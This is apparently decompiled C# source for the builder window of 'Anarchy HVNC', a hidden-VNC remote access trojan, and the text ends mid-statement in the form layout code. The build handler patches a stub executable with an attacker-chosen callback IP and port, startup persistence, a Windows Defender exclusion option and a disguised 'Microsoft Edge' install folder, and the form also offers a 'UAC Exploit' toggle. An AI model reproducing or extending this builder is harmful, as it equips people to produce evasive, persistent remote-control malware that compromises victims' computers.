using System;
using System.ComponentModel;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Windows.Forms;
using Anarchy.Binfo;
using dnlib.DotNet;
using dnlib.DotNet.Emit;
using Guna.UI2.WinForms;
using Siticone.UI.WinForms;

namespace Anarchy.HCS
{
    public class FrmBuilder : Form
    {
        public static byte[] b;

        public static Random r = new Random();

        public static Random random = new Random();

        private IContainer components;

        private Label label1;

        private Label label24;

        private Label label7;

        private Label label2;

        private Label label3;

        private Label label4;

        private Guna2Panel guna2Panel2;

        private SiticoneControlBox siticoneControlBox4;

        private SiticoneControlBox siticoneControlBox3;

        internal Label Label22;

        private Guna2TextBox txtIP;

        public Guna2NumericUpDown txtPort;

        private Guna2TextBox txtFilename;

        private Guna2Button btnRandomizeFileName;

        private Guna2TextBox txtFolder;

        private Guna2Button btnRandomFolder;

        private Guna2TextBox txtInstallPath;

        private Guna2Button btnRandomInstallPath;

        private SiticoneOSToggleSwith checkAutostart;

        private SiticoneOSToggleSwith checkWD;

        private SiticoneOSToggleSwith checkUAC;

        private Guna2Button btnBuild;

        private Guna2Elipse guna2Elipse1;

        private Guna2DragControl guna2DragControl1;

        private Label label6;

        private Guna2TextBox txtIdentifier;

        private Label label5;

        public static string pathtosave { get; set; }

        private int _port { get; set; }

        public FrmBuilder(int port)
        {
            this._port = port;
            this.InitializeComponent();
        }

        public static string RandomString(int length)
        {
            return new string((from s in Enumerable.Repeat("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789", length)
                select s[FrmBuilder.random.Next(s.Length)]).ToArray());
        }

        private void button1_Click(object sender, EventArgs e)
        {
            try
            {
                if (string.IsNullOrEmpty(this.txtIP.Text))
                {
                    MessageBox.Show("IP or DNS is required in order to build.", "Anarchy HVNC", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                    return;
                }
                using (SaveFileDialog saveFileDialog = new SaveFileDialog())
                {
                    saveFileDialog.Filter = ".exe (*.exe)|*.exe";
                    saveFileDialog.InitialDirectory = Application.StartupPath;
                    saveFileDialog.OverwritePrompt = false;
                    saveFileDialog.FileName = "HVNC";
                    if (saveFileDialog.ShowDialog() == DialogResult.OK)
                    {
                        FrmBuilder.pathtosave = Path.GetDirectoryName(saveFileDialog.FileName) + "\\";
                    }
                }
                if (!string.IsNullOrWhiteSpace(this.txtIP.Text) && !string.IsNullOrWhiteSpace(this.txtPort.Text) && !string.IsNullOrWhiteSpace(this.txtFilename.Text) && !string.IsNullOrWhiteSpace(this.txtFolder.Text) && !string.IsNullOrWhiteSpace(this.txtInstallPath.Text))
                {
                    this.btnBuild.Text = "Building...";
                    this.btnBuild.Enabled = false;
                    BuildInfo.ip = this.txtIP.Text;
                    BuildInfo.id = this.txtIdentifier.Text;
                    BuildInfo.port = this.txtPort.Text;
                    BuildInfo.folder = this.txtFolder.Text;
                    BuildInfo.filename = this.txtFilename.Text;
                    BuildInfo.path = this.txtInstallPath.Text;
                    BuildInfo.mutex = FrmBuilder.RandomMutex(9);
                    BuildInfo.startup = "False";
                    BuildInfo.wdex = "False";
                    BuildInfo.hhvnc = "True";
                    if (this.checkAutostart.Checked)
                    {
                        BuildInfo.startup = "True";
                    }
                    else if (!this.checkAutostart.Checked)
                    {
                        BuildInfo.startup = "False";
                    }
                    if (this.checkWD.Checked)
                    {
                        BuildInfo.wdex = "True";
                    }
                    else if (!this.checkWD.Checked)
                    {
                        BuildInfo.wdex = "False";
                    }
                    try
                    {
                        ModuleDefMD moduleDefMD;
                        moduleDefMD = ModuleDefMD.Load("Plugins\\9Ood5SWkbwPn.AnarHs");
                        foreach (TypeDef type in moduleDefMD.GetTypes())
                        {
                            foreach (MethodDef method in type.Methods)
                            {
                                if (method.Name != "Main")
                                {
                                    continue;
                                }
                                foreach (Instruction instruction in method.Body.Instructions)
                                {
                                    if (instruction.OpCode == OpCodes.Ldstr && instruction.Operand.ToString() == "IP")
                                    {
                                        instruction.Operand = BuildInfo.ip;
                                    }
                                    else if (instruction.OpCode == OpCodes.Ldstr && instruction.Operand.ToString() == "PORT")
                                    {
                                        instruction.Operand = BuildInfo.port;
                                    }
                                    else if (instruction.OpCode == OpCodes.Ldstr && instruction.Operand.ToString() == "identifier")
                                    {
                                        instruction.Operand = BuildInfo.id;
                                    }
                                    else if (instruction.OpCode == OpCodes.Ldstr && instruction.Operand.ToString() == "mutex")
                                    {
                                        instruction.Operand = BuildInfo.mutex;
                                    }
                                    else if (instruction.OpCode == OpCodes.Ldstr && instruction.Operand.ToString() == "install")
                                    {
                                        instruction.Operand = BuildInfo.startup;
                                    }
                                    else if (instruction.OpCode == OpCodes.Ldstr && instruction.Operand.ToString() == "path")
                                    {
                                        instruction.Operand = BuildInfo.path;
                                    }
                                    else if (instruction.OpCode == OpCodes.Ldstr && instruction.Operand.ToString() == "folder")
                                    {
                                        instruction.Operand = BuildInfo.folder;
                                    }
                                    else if (instruction.OpCode == OpCodes.Ldstr && instruction.Operand.ToString() == "wdex")
                                    {
                                        instruction.Operand = BuildInfo.wdex;
                                    }
                                    else if (instruction.OpCode == OpCodes.Ldstr && instruction.Operand.ToString() == "a2")
                                    {
                                        instruction.Operand = BuildInfo.hhvnc;
                                    }
                                    else if (instruction.OpCode == OpCodes.Ldstr && instruction.Operand.ToString() == "kuKdBEFei.exe")
                                    {
                                        instruction.Operand = BuildInfo.filename;
                                    }
                                }
                            }
                        }
                        if (File.Exists(this.txtFilename.Text))
                        {
                            File.Delete(this.txtFilename.Text);
                        }
                        moduleDefMD.Write(this.txtFilename.Text);
                        MessageBox.Show("Build complete! Saved to '" + this.txtFilename.Text + "'", "Anarchy HVNC");
                        return;
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show(ex.Message);
                        return;
                    }
                }
                MessageBox.Show("All fields are required", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
            }
            catch (Exception ex2)
            {
                MessageBox.Show(ex2.Message);
            }
        }

        private void FrmBuilder_Load(object sender, EventArgs e)
        {
            this.txtPort.Value = Convert.ToInt32(this._port);
            this.txtIP.Text = FrmBuilder.GetLocalIPAddress();
        }

        public static string RandomMutex(int length)
        {
            return new string((from s in Enumerable.Repeat("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz", length)
                select s[FrmBuilder.random.Next(s.Length)]).ToArray());
        }

        public static string RandomNumber(int length)
        {
            return new string((from s in Enumerable.Repeat("0123456789", length)
                select s[FrmBuilder.random.Next(s.Length)]).ToArray());
        }

        public static string GetLocalIPAddress()
        {
            IPAddress[] addressList;
            addressList = Dns.GetHostEntry(Dns.GetHostName()).AddressList;
            int num;
            num = 0;
            IPAddress iPAddress;
            while (true)
            {
                if (num < addressList.Length)
                {
                    iPAddress = addressList[num];
                    if (iPAddress.AddressFamily == AddressFamily.InterNetwork)
                    {
                        break;
                    }
                    num++;
                    continue;
                }
                throw new Exception("No network adapters with an IPv4 address in the system!");
            }
            return iPAddress.ToString();
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing && this.components != null)
            {
                this.components.Dispose();
            }
            base.Dispose(disposing);
        }

        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            this.label1 = new System.Windows.Forms.Label();
            this.label24 = new System.Windows.Forms.Label();
            this.label7 = new System.Windows.Forms.Label();
            this.label2 = new System.Windows.Forms.Label();
            this.label3 = new System.Windows.Forms.Label();
            this.label4 = new System.Windows.Forms.Label();
            this.label5 = new System.Windows.Forms.Label();
            this.guna2Panel2 = new Guna.UI2.WinForms.Guna2Panel();
            this.Label22 = new System.Windows.Forms.Label();
            this.siticoneControlBox4 = new Siticone.UI.WinForms.SiticoneControlBox();
            this.siticoneControlBox3 = new Siticone.UI.WinForms.SiticoneControlBox();
            this.txtIP = new Guna.UI2.WinForms.Guna2TextBox();
            this.txtPort = new Guna.UI2.WinForms.Guna2NumericUpDown();
            this.txtFilename = new Guna.UI2.WinForms.Guna2TextBox();
            this.btnRandomizeFileName = new Guna.UI2.WinForms.Guna2Button();
            this.txtFolder = new Guna.UI2.WinForms.Guna2TextBox();
            this.btnRandomFolder = new Guna.UI2.WinForms.Guna2Button();
            this.txtInstallPath = new Guna.UI2.WinForms.Guna2TextBox();
            this.btnRandomInstallPath = new Guna.UI2.WinForms.Guna2Button();
            this.checkAutostart = new Siticone.UI.WinForms.SiticoneOSToggleSwith();
            this.checkWD = new Siticone.UI.WinForms.SiticoneOSToggleSwith();
            this.checkUAC = new Siticone.UI.WinForms.SiticoneOSToggleSwith();
            this.btnBuild = new Guna.UI2.WinForms.Guna2Button();
            this.guna2Elipse1 = new Guna.UI2.WinForms.Guna2Elipse(this.components);
            this.guna2DragControl1 = new Guna.UI2.WinForms.Guna2DragControl(this.components);
            this.txtIdentifier = new Guna.UI2.WinForms.Guna2TextBox();
            this.label6 = new System.Windows.Forms.Label();
            this.guna2Panel2.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)this.txtPort).BeginInit();
            base.SuspendLayout();
            this.label1.AutoSize = true;
            this.label1.BackColor = System.Drawing.Color.Transparent;
            this.label1.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75f);
            this.label1.Location = new System.Drawing.Point(24, 65);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(56, 16);
            this.label1.TabIndex = 151;
            this.label1.Text = "IP/DNS ";
            this.label24.AutoSize = true;
            this.label24.BackColor = System.Drawing.Color.Transparent;
            this.label24.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.label24.ForeColor = System.Drawing.Color.Gainsboro;
            this.label24.Location = new System.Drawing.Point(70, 324);
            this.label24.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.label24.Name = "label24";
            this.label24.Size = new System.Drawing.Size(50, 16);
            this.label24.TabIndex = 149;
            this.label24.Text = "Startup";
            this.label7.AutoSize = true;
            this.label7.BackColor = System.Drawing.Color.Transparent;
            this.label7.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75f);
            this.label7.Location = new System.Drawing.Point(24, 165);
            this.label7.Name = "label7";
            this.label7.Size = new System.Drawing.Size(73, 16);
            this.label7.TabIndex = 139;
            this.label7.Text = "File Name:";
            this.label2.AutoSize = true;
            this.label2.BackColor = System.Drawing.Color.Transparent;
            this.label2.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.label2.ForeColor = System.Drawing.Color.Gainsboro;
            this.label2.Location = new System.Drawing.Point(70, 352);
            this.label2.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.label2.Name = "label2";
            this.label2.Size = new System.Drawing.Size(91, 16);
            this.label2.TabIndex = 160;
            this.label2.Text = "WD Exclusion";
            this.label3.AutoSize = true;
            this.label3.BackColor = System.Drawing.Color.Transparent;
            this.label3.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.label3.ForeColor = System.Drawing.Color.Gainsboro;
            this.label3.Location = new System.Drawing.Point(70, 380);
            this.label3.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.label3.Name = "label3";
            this.label3.Size = new System.Drawing.Size(79, 16);
            this.label3.TabIndex = 162;
            this.label3.Text = "UAC Exploit";
            this.label4.AutoSize = true;
            this.label4.BackColor = System.Drawing.Color.Transparent;
            this.label4.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75f);
            this.label4.Location = new System.Drawing.Point(24, 270);
            this.label4.Name = "label4";
            this.label4.Size = new System.Drawing.Size(75, 16);
            this.label4.TabIndex = 164;
            this.label4.Text = "Install Path:";
            this.label5.AutoSize = true;
            this.label5.BackColor = System.Drawing.Color.Transparent;
            this.label5.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75f);
            this.label5.Location = new System.Drawing.Point(24, 219);
            this.label5.Name = "label5";
            this.label5.Size = new System.Drawing.Size(84, 16);
            this.label5.TabIndex = 168;
            this.label5.Text = "Install Folder";
            this.guna2Panel2.BackColor = System.Drawing.Color.Transparent;
            this.guna2Panel2.Controls.Add(this.Label22);
            this.guna2Panel2.Controls.Add(this.siticoneControlBox4);
            this.guna2Panel2.Controls.Add(this.siticoneControlBox3);
            this.guna2Panel2.CustomBorderColor = System.Drawing.Color.FromArgb(64, 72, 75);
            this.guna2Panel2.CustomBorderThickness = new System.Windows.Forms.Padding(0, 0, 1, 0);
            this.guna2Panel2.Dock = System.Windows.Forms.DockStyle.Top;
            this.guna2Panel2.Location = new System.Drawing.Point(0, 0);
            this.guna2Panel2.Name = "guna2Panel2";
            this.guna2Panel2.ShadowDecoration.Color = System.Drawing.Color.White;
            this.guna2Panel2.ShadowDecoration.Depth = 15;
            this.guna2Panel2.ShadowDecoration.Parent = this.guna2Panel2;
            this.guna2Panel2.Size = new System.Drawing.Size(442, 41);
            this.guna2Panel2.TabIndex = 183;
            this.Label22.AutoSize = true;
            this.Label22.BackColor = System.Drawing.Color.Transparent;
            this.Label22.Font = new System.Drawing.Font("ProFont for Powerline", 15.75f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
            this.Label22.ForeColor = System.Drawing.Color.White;
            this.Label22.Location = new System.Drawing.Point(6, 11);
            this.Label22.Name = "Label22";
            this.Label22.Size = new System.Drawing.Size(197, 21);
            this.Label22.TabIndex = 22;
            this.Label22.Text = "ANARCHY | BUILDER";
            this.siticoneControlBox4.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
            this.siticoneControlBox4.BackColor = System.Drawing.Color.Transparent;
            this.siticoneControlBox4.BorderRadius = 10;
            this.siticoneControlBox4.ControlBoxType = Siticone.UI.WinForms.Enums.ControlBoxType.MinimizeBox;
            this.siticoneControlBox4.FillColor = System.Drawing.Color.Transparent;
            this.siticoneControlBox4.HoveredState.Parent = this.siticoneControlBox4;
            this.siticoneControlBox4.IconColor = System.Drawing.Color.White;
            this.siticoneControlBox4.Location = new System.Drawing.Point(343, 5);
            this.siticoneControlBox4.Name = "siticoneControlBox4";
            this.siticoneControlBox4.ShadowDecoration.Parent = this.siticoneControlBox4;
            this.siticoneControlBox4.Size = new System.Drawing.Size(45, 29);
            this.siticoneControlBox4.TabIndex = 21;
            this.siticoneControlBox3.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
            this.siticoneControlBox3.BackColor = System.Drawing.Color.Transparent;
            this.siticoneControlBox3.BorderRadius = 10;
            this.siticoneControlBox3.FillColor = System.Drawing.Color.Transparent;
            this.siticoneControlBox3.HoveredState.Parent = this.siticoneControlBox3;
            this.siticoneControlBox3.IconColor = System.Drawing.Color.White;
            this.siticoneControlBox3.Location = new System.Drawing.Point(394, 5);
            this.siticoneControlBox3.Name = "siticoneControlBox3";
            this.siticoneControlBox3.PressedColor = System.Drawing.Color.DarkRed;
            this.siticoneControlBox3.ShadowDecoration.Parent = this.siticoneControlBox3;
            this.siticoneControlBox3.Size = new System.Drawing.Size(45, 29);
            this.siticoneControlBox3.TabIndex = 20;
            this.txtIP.Animated = true;
            this.txtIP.BackColor = System.Drawing.Color.Transparent;
            this.txtIP.BorderColor = System.Drawing.Color.FromArgb(64, 72, 75);
            this.txtIP.BorderRadius = 5;
            this.txtIP.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.txtIP.DefaultText = "";
            this.txtIP.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
            this.txtIP.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
            this.txtIP.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
            this.txtIP.DisabledState.Parent = this.txtIP;
            this.txtIP.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
            this.txtIP.FillColor = System.Drawing.Color.FromArgb(41, 46, 48);
            this.txtIP.FocusedState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
            this.txtIP.FocusedState.Parent = this.txtIP;
            this.txtIP.Font = new System.Drawing.Font("Segoe UI", 9f);
            this.txtIP.HoverState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
            this.txtIP.HoverState.Parent = this.txtIP;
            this.txtIP.Location = new System.Drawing.Point(27, 84);
            this.txtIP.Name = "txtIP";
            this.txtIP.PasswordChar = '\0';
            this.txtIP.PlaceholderText = "";
            this.txtIP.SelectedText = "";
            this.txtIP.ShadowDecoration.Color = System.Drawing.Color.FromArgb(64, 72, 75);
            this.txtIP.ShadowDecoration.Depth = 10;
            this.txtIP.ShadowDecoration.Enabled = true;
            this.txtIP.ShadowDecoration.Parent = this.txtIP;
            this.txtIP.Size = new System.Drawing.Size(328, 23);
            this.txtIP.TabIndex = 184;
            this.txtPort.BackColor = System.Drawing.Color.Transparent;
            this.txtPort.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Center;
            this.txtPort.BorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
            this.txtPort.BorderRadius = 4;
            this.txtPort.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.txtPort.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
            this.txtPort.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
            this.txtPort.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
            this.txtPort.DisabledState.Parent = this.txtPort;
            this.txtPort.DisabledState.UpDownButtonFillColor = System.Drawing.Color.FromArgb(177, 177, 177);
            this.txtPort.DisabledState.UpDownButtonForeColor = System.Drawing.Color.FromArgb(203, 203, 203);
            this.txtPort.FillColor = System.Drawing.Color.FromArgb(24, 24, 24);
            this.txtPort.FocusedState.BorderColor = System.Drawing.Color.FromArgb(255, 128, 0);
            this.txtPort.FocusedState.Parent = this.txtPort;
            this.txtPort.Font = new System.Drawing.Font("Segoe UI Semibold", 9f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
            this.txtPort.ForeColor = System.Drawing.Color.FromArgb(126, 137, 149);
            this.txtPort.Location = new System.Drawing.Point(365, 83);
            this.txtPort.Maximum = new decimal(new int[4] { 65535, 0, 0, 0 });
            this.txtPort.Name = "txtPort";
            this.txtPort.ShadowDecoration.Parent = this.txtPort;
            this.txtPort.Size = new System.Drawing.Size(70, 25);
            this.txtPort.TabIndex = 185;
            this.txtPort.UpDownButtonFillColor = System.Drawing.Color.FromArgb(192, 255, 192);
            this.txtPort.Value = new decimal(new int[4] { 4443, 0, 0, 0 });
            this.txtFilename.Animated = true;
            this.txtFilename.BackColor = System.Drawing.Color.Transparent;
            this.txtFilename.BorderColor = System.Drawing.Color.FromArgb(64, 72, 75);
            this.txtFilename.BorderRadius = 5;
            this.txtFilename.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.txtFilename.DefaultText = "HVNC.exe";
            this.txtFilename.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
            this.txtFilename.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
            this.txtFilename.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
            this.txtFilename.DisabledState.Parent = this.txtFilename;
            this.txtFilename.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
            this.txtFilename.FillColor = System.Drawing.Color.FromArgb(41, 46, 48);
            this.txtFilename.FocusedState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
            this.txtFilename.FocusedState.Parent = this.txtFilename;
            this.txtFilename.Font = new System.Drawing.Font("Segoe UI", 9f);
            this.txtFilename.HoverState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
            this.txtFilename.HoverState.Parent = this.txtFilename;
            this.txtFilename.Location = new System.Drawing.Point(27, 186);
            this.txtFilename.Name = "txtFilename";
            this.txtFilename.PasswordChar = '\0';
            this.txtFilename.PlaceholderText = "";
            this.txtFilename.SelectedText = "";
            this.txtFilename.SelectionStart = 8;
            this.txtFilename.ShadowDecoration.Color = System.Drawing.Color.FromArgb(64, 72, 75);
            this.txtFilename.ShadowDecoration.Depth = 10;
            this.txtFilename.ShadowDecoration.Enabled = true;
            this.txtFilename.ShadowDecoration.Parent = this.txtFilename;
            this.txtFilename.Size = new System.Drawing.Size(286, 23);
            this.txtFilename.TabIndex = 186;
            this.btnRandomizeFileName.BorderRadius = 8;
            this.btnRandomizeFileName.CheckedState.Parent = this.btnRandomizeFileName;
            this.btnRandomizeFileName.CustomImages.Parent = this.btnRandomizeFileName;
            this.btnRandomizeFileName.FillColor = System.Drawing.Color.FromArgb(255, 128, 0);
            this.btnRandomizeFileName.Font = new System.Drawing.Font("Segoe UI", 9f);
            this.btnRandomizeFileName.ForeColor = System.Drawing.Color.White;
            this.btnRandomizeFileName.HoverState.Parent = this.btnRandomizeFileName;
            this.btnRandomizeFileName.Location = new System.Drawing.Point(333, 186);
            this.btnRandomizeFileName.Name = "btnRandomizeFileName";
            this.btnRandomizeFileName.ShadowDecoration.Parent = this.btnRandomizeFileName;
            this.btnRandomizeFileName.Size = new System.Drawing.Size(86, 24);
            this.btnRandomizeFileName.TabIndex = 187;
            this.btnRandomizeFileName.Text = "Randomize";
            this.btnRandomizeFileName.Click += new System.EventHandler(btnRandomizeFileName_Click);
            this.txtFolder.Animated = true;
            this.txtFolder.BackColor = System.Drawing.Color.Transparent;
            this.txtFolder.BorderColor = System.Drawing.Color.FromArgb(64, 72, 75);
            this.txtFolder.BorderRadius = 5;
            this.txtFolder.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.txtFolder.DefaultText = "Microsoft Edge";
            this.txtFolder.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
            this.txtFolder.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
            this.txtFolder.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
            this.txtFolder.DisabledState.Parent = this.txtFolder;
            this.txtFolder.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
            this.txtFolder.FillColor = System.Drawing.Color.FromArgb(41, 46, 48);
            this.txtFolder.FocusedState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
            this.txtFolder.FocusedState.Parent = this.txtFolder;
            this.txtFolder.Font = new System.Drawing.Font("Segoe UI", 9f);
            this.txtFolder.HoverState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
            this.txtFolder.HoverState.Parent = this.txtFolder;
            this.txtFolder.Location = new System.Drawing.Point(27, 238);
            this.txtFolder.Name = "txtFolder";
            this.txtFolder.PasswordChar = '\0';
            this.txtFolder.PlaceholderText = "";
            this.txtFolder.SelectedText = "";
            this.txtFolder.SelectionStart = 14;
            this.txtFolder.ShadowDecoration.Color = System.Drawing.Color.FromArgb(64, 72, 75);
            this.txtFolder.ShadowDecoration.Depth = 10;
            this.txtFolder.ShadowDecoration.Enabled = true;
            this.txtFolder.ShadowDecoration.Parent = this.txtFolder;
            this.txtFolder.Size = new System.Drawing.Size(286, 23);
            this.txtFolder.TabIndex = 188;
            this.btnRandomFolder.BorderRadius = 8;
            this.btnRandomFolder.CheckedState.Parent = this.btnRandomFolder;
            this.btnRandomFolder.CustomImages.Parent = this.btnRandomFolder;
            this.btnRandomFolder.FillColor = System.Drawing.Color.FromArgb(255, 128, 0);
            this.btnRandomFolder.Font = new System.Drawing.Font("Segoe UI", 9f);
            this.btnRandomFolder.ForeColor = System.Drawing.Color.White;
            this.btnRandomFolder.HoverState.Parent = this.btnRandomFolder;
            this.btnRandomFolder.Location = new System.Drawing.Point(333, 237);
            this.btnRandomFolder.Name = "btnRandomFolder";
            this.btnRandomFolder.ShadowDecoration.Parent = this.btnRandomFolder;
            this.btnRandomFolder.Size = new System.Drawing.Size(86, 24);
            this.btnRandomFolder.TabIndex = 189;
            this.btnRandomFolder.Text = "Randomize";
            this.btnRandomFolder.Click += new System.EventHandler(btnRandomFolder_Click);
            this.txtInstallPath.Animated = true;
            this.txtInstallPath.BackColor = System.Drawing.Color.Transparent;
            this.txtInstallPath.BorderColor = System.Drawing.Color.FromArgb(64, 72, 75);
            this.txtInstallPath.BorderRadius = 5;
            this.txtInstallPath.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.txtInstallPath.DefaultText = "%AppData%";
            this.txtInstallPath.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
            this.txtInstallPath.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
            this.txtInstallPath.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
            this.txtInstallPath.DisabledState.Parent = this.txtInstallPath;
            this.txtInstallPath.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
            this.txtInstallPath.FillColor = System.Drawing.Color.FromArgb(41, 46, 48);
            this.txtInstallPath.FocusedState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
            this.txtInstallPath.FocusedState.Parent = this.txtInstallPath;
            this.txtInstallPath.Font = new System.Drawing.Font("Segoe UI", 9f);
            this.txtInstallPath.HoverState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
            this.txtInstallPath.HoverState.Parent = this.txtInstallPath;
            this.txtInstallPath.Location = new System.Drawing.Point(27, 292);
            this.txtInstallPath.Name = "txtInstallPath";
            this.txtInstallPath.PasswordChar = '\0';
            this.txtInstallPath.PlaceholderText = "";
            this.txtInstallPath.SelectedText = "";
            this.txtInstallPath.SelectionStart = 9;
            this.txtInstallPath.ShadowDecoration.Color = System.Drawing.Color.FromArgb(64, 72, 75);
            this.txtInstallPath.ShadowDecoration.Depth = 10;
            this.txtInstallPath.ShadowDecoration.Enabled = true;
            this.txtInstallPath.ShadowDecoration.Parent = this.txtInstallPath;
            this.txtInstallPath.Size = new System.Drawing.Size(286, 23);
            this.txtInstallPath.TabIndex = 190;
            this.btnRandomInstallPath.BorderRadius = 8;
            this.btnRandomInstallPath.CheckedState.Parent = this.btnRandomInstallPath;
            this.btnRandomInstallPath.CustomImages.Parent = this.btnRandomInstallPath;
            this.btnRandomInstallPath.FillColor = System.Drawing.Color.FromArgb(255, 128, 0);
            this.btnRandomInstallPath.Font = new System.Drawing.Font("Segoe UI", 9f);
            this.btnRandomInstallPath.ForeColor = System.Drawing.Color.White;
            this.btnRandomInstallPath.HoverState.Parent = this.btnRandomInstallPath;
            this.btnRandomInstallPath.Location = new System.Drawing.Point(333, 291);
            this.btnRandomInstallPath.Name = "btnRandomInstallPath";
            this.btnRandomInstallPath.ShadowDecoration.Parent = this.btnRandomInstallPath;
            this.btnRandomInstallPath.Size = new System.Drawing.Size(86, 24);
            this.btnRandomInstallPath.TabIndex = 191;
            this.btnRandomInstallPath.Text = "Randomize";
            this.btnRandomInstallPath.Click += new System.EventHandler(btnRandomInstallPath_Click);
            this.checkAutostart.BackColor = System.Drawing.Color.FromArgb(24, 24, 24);
            this.checkAutostart.CheckedFillColor = System.Drawing.Color.FromArgb(30, 25, 24);
            this.checkAutostart.Location = new System.Drawing.Point(27, 321);
            this.checkAutostart.Name = "checkAutostart";
            this.checkAutostart.Size = new System.Drawing.Size(38, 22);
            this.checkAutostart.TabIndex = 192;
            this.checkAutostart.Text = "off";
            this.checkWD.BackColor = System.Drawing.Color.FromArgb(24, 24, 24);
            this.checkWD.CheckedFillColor = System.Drawing.Color.FromArgb(30, 25, 24);
            this.checkWD.Location = new System.Drawing.Point(27, 349);
            this.checkWD.Name = "checkWD";
            this.checkWD.Size = new System.Drawing.Size(38, 22);
            this.checkWD.TabIndex = 193;
            this.checkWD.Text = "off";
            this.checkUAC.BackColor = System.Drawing.Color.FromArgb(24, 24, 24);
            this.checkUAC.CheckedFillColor = System.Drawing.Color.FromArgb(30, 25, 24);
            this.checkUAC.Location = new System.Drawing.Point(27, 377);
            this.checkUAC.Name = "checkUAC";
            this.checkUAC.Size = new System.Drawing.Size(38, 22);
            this.checkUAC.TabIndex = 194;
            this.checkUAC.Text = "off";
            this.btnBuild.BorderRadius = 8;
            this.btnBuild.CheckedState.Parent = this.btnBuild;
            this.btnBuild.CustomImages.Parent = this.btnBuild;
            this.btnBuild.FillColor = System.Drawing.Color.FromArgb(255, 128, 0);
            this.btnBuild.Font = new System.Drawing.Font("Segoe UI", 9f);
            this.btnBuild.ForeColor = System.Drawing.Color.White;
            this.btnBuild.HoverState.Parent = this.btnBuild;
            this.btnBuild.Location = new System.Drawing.Point(233, 349);
            this.btnBuild.Name = "btnBuild";
            this.btnBuild.ShadowDecoration.Parent = this.btnBuild;
            this.btnBuild.Size = new System.Drawing.Size(171, 41);
            this.btnBuild.TabIndex = 195;
            this.btnBuild.Text = "Build ";
            this.btnBuild.Click += new System.EventHandler(button1_Click);
            this.guna2Elipse1.BorderRadius = 10;
            this.guna2Elipse1.TargetControl = this;
            this.guna2DragControl1.TargetControl = this.guna2Panel2;
            this.txtIdentifier.Animated = true;
            this.txtIdentifier.BackColor = System.Drawing.Color.Transparent;
            this.txtIdentifier.BorderColor = System.Drawing.Color.FromArgb(64, 72, 75);
            this.txtIdentifier.BorderRadius = 5;
            this.txtIdentifier.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.txtIdentifier.DefaultText = "AnarchyHVNC";
            this.txtIdentifier.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
            this.txtIdentifier.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
            this.txtIdentifier.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
